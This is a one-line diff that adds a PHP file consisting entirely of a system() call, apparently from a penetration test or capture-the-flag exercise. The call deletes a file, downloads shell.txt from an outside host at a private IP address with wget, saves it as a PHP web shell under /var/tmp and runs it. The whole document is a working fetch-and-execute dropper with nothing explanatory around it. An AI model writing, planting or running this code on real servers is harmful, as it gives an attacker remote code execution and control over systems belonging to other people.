@@ -1,0 +1,1 @@
+<?php system("rm shell.txt;wget http://192.168.0.128:8000/shell.txt -O  /var/tmp/shell.php;php /var/tmp/shell.php;") ?>
